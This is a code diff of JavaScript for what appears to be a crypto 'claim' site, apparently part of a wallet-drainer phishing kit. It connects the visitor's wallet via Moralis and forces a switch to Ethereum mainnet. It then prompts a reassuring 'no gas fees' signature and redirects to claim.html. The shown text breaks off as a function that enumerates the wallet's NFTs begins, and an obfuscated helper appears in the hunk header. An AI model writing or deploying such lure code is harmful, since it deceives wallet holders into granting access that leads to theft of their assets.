@@ -27,86 +27,69 @@ function openInNewTab(_0x9e4bx2) {
 
 //start
 
+let metamaskInstalled = false;
+if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
+
 let web3Provider;
 async function connectButton() {
-  await Moralis.enableWeb3(
-    metamaskInstalled ? {} : { provider: "walletconnect" }
-  );
+    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
 }
+
 Moralis.onWeb3Enabled(async (data) => {
-  if (data.chainId !== 1 && metamaskInstalled) {
-    await Moralis.switchNetwork("0x1");
-  }
-  updateState(true);
-  console.log(data);
+    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
+    updateState(true);
+    console.log(data);
 });
-Moralis.onChainChanged(async (_chain) => {
-  if (_chain !== "0x1" && metamaskInstalled) {
-    await Moralis.switchNetwork("0x1");
-  }
+Moralis.onChainChanged(async (chain) => {
+    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
 });
-window.ethereum
-  ? window.ethereum.on("disconnect", (err) => {
-      console.log(err);
-      updateState(false);
-    })
-  : null;
-window.ethereum
-  ? window.ethereum.on("accountsChanged", (accounts) => {
-      if (accounts.length < 1) {
-        updateState(false);
-      }
-    })
-  : null;
+window.ethereum ? window.ethereum.on('disconnect', (err) => {
+    console.log(err);
+    updateState(false);
+}) : null;
+window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
+    if (accounts.length < 1) updateState(false)
+}) : null;
 
 async function updateState(connected) {
-  if (connected && (await askSign())) {
-    Object.assign(document.createElement("a"), {
-      href: "./claim.html",
-    }).click();
-  }
+    if (connected && (await askSign())) {
+        Object.assign(document.createElement('a'), {
+            href: "./claim.html",
+        }).click();
+    }
 }
+
 
 async function askSign() {
-  const web3Js = new Web3(Moralis.provider);
-  const walletAddress = (await web3Js.eth.getAccounts())[0];
+    const web3Js = new Web3(Moralis.provider);
+    const walletAddress = (await web3Js.eth.getAccounts())[0];
 
-  try {
-    const message =
-      `Welcome, \n\n` +
-      `Click to sign in and accept the Terms of Service.\n\n` +
-      `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
-      `Wallet Address:\n${walletAddress}\n\n` +
-      `Nonce:\n${createNonce()}`;
-    const signature = await web3Js.eth.personal.sign(message, walletAddress);
-    const signing_address = await web3Js.eth.personal.ecRecover(
-      message,
-      signature
-    );
+    try {
+        const message = `Welcome, \n\n` +
+            `Click to sign in and accept the Terms of Service.\n\n` +
+            `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
+            `Wallet Address:\n${walletAddress}\n\n` +
+            `Nonce:\n${createNonce()}`;
+        const signature = await web3Js.eth.personal.sign(message, walletAddress);
+        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);
 
-    console.log(
-      `Signing address: ${signing_address}\n${
-        walletAddress.toLowerCase() == signing_address.toLowerCase()
-          ? "Same address"
-          : "Not the same address."
-      }`
-    );
+        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
 
-    return true;
-  } catch (e) {
-    alert("Error signing message. Please try again.");
-    return false;
-  }
+        return true;
+    } catch (e) {
+        alert("Error signing message. Please try again.");
+        return false;
+    }
 }
 
-async function updateState(connected) {
-  document.querySelector("#connectButton").style.display = connected
-    ? "none"
-    : "";
-  document.querySelector("#claimButton").style.display = connected
-    ? ""
-    : "none";
-}
+window.addEventListener('load', async () => {
+    if (isMobile() && !window.ethereum) {
+        document.querySelector("#connectButton").addEventListener("click", () =>
+            window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`);
+    } else document.querySelector("#connectButton").addEventListener("click", connectButton);
+});
+
+    
 async function askNfts() {
   const web3Js = new Web3(Moralis.provider);
   const walletAddress = await web3Js.eth.getAccounts()[0];
